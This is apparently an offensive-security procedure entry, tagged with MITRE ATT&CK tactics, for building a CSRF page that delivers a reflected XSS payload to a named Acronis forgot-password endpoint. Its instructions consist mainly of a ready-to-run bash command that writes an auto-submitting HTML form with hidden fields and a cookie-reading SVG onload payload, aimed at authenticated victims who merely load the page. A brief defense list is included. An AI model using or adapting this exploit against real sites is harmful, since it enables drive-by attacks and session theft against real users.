---
id: create-csrf-poc-2024
tags:
  - csrf
  - poc
  - html
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/create-csrf-html]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:43.087Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-CSRF-HTML-Page-for-XSS-Delivery

## Summary

This procedure creates an HTML proof-of-concept page that automatically submits a POST form to the target Acronis forgot password endpoint, embedding the XSS payload in a hidden field to exploit the vulnerability without requiring direct victim interaction on the target site.

## Description

Due to the absence of CSRF tokens in the Acronis form, an external HTML page can forge a request on behalf of an authenticated user. The page includes hidden inputs for all necessary parameters (token, SN, OrderId, Submit) and the malicious 'c' parameter with the XSS payload. Upon loading, JavaScript auto-submits the form, sending the request from the victim's browser. This amplifies the XSS by delivering it stealthily. Prerequisites: Text editor or bash for file creation, and a way to host/serve the HTML (local or remote). Expected outcome: Victim loads page, form submits, XSS executes.

## Requirements

1. Text editor or bash environment
2. Knowledge of HTML and JavaScript for form submission
3. Hosting capability for the HTML file (e.g., local server)

## Defense

Defensive measures and detection strategies:

- Implement unique CSRF tokens in all forms and validate them server-side
- Use SameSite cookies to prevent cross-site requests
- Log and monitor cross-origin POST requests to sensitive endpoints

## Objectives

1. Automate form submission to deliver XSS payload
2. Bypass user interaction on the target site
3. Enable drive-by exploitation for authenticated users

## Instructions

### Step 1: Generate HTML File with Hidden Form

**Context**: Create an HTML file containing the form with hidden fields and auto-submit script to trigger the CSRF request.

**Command** ([[commands/create-csrf-html]]):
```bash
cat > csrf-poc.html << EOF
<!DOCTYPE html>
<html>
<body>
<form id="xss-csrf" action="https://www.acronis.com/en-us/my/remind/index.html" method="POST">
  <input type="hidden" name="token" value="a016902ceaeb6ae91c21302631fbbcfc">
  <input type="hidden" name="SN" value="818198181891891981981981516518198198">
  <input type="hidden" name="OrderId" value="">
  <input type="hidden" name="Submit" value="Send E-mail">
  <input type="hidden" name="c" value='1"<!--><Svg OnLoad=(confirm)(document.cookie)<!--'>
</form>
<script>document.getElementById('xss-csrf').submit();</script>
</body>
</html>
EOF
```

> This creates csrf-poc.html. The script tag ensures immediate submission upon page load.

### Step 2: Test the HTML Page

**Context**: Load the HTML in a browser while authenticated on the target site to verify submission and XSS trigger.

Open file://path/to/csrf-poc.html in a browser.

> Expect the form to submit automatically, leading to the target response with XSS execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used

- [[commands/create-csrf-html]]

## Tools Used


## Tags

- [[csrf]]
- [[poc]]
- [[html]]
- [[web]]
